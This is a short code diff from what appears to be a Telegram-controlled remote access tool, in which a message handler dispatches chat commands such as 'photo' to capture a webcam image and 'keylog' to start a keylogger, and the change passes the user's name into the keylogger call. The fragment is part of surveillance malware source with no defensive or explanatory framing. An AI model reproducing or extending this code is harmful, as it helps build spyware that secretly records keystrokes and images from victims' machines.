@@ -47,7 +47,7 @@ def replymessage(first_name, last_name, command, chat_id):
             elif((list_command[0] == "photo") | (list_command[0] == "Photo")):
                 feature.take_photo(chat_id)
             elif((list_command[0] == "keylog") | (list_command[0] == "Keylog")):
-                feature.key_logger(chat_id)
+                feature.key_logger(chat_id,first_name,last_name)
             elif(list_command[0] == feature.random_f):
                 feature.save_file_in_fin(chat_id)
             else:
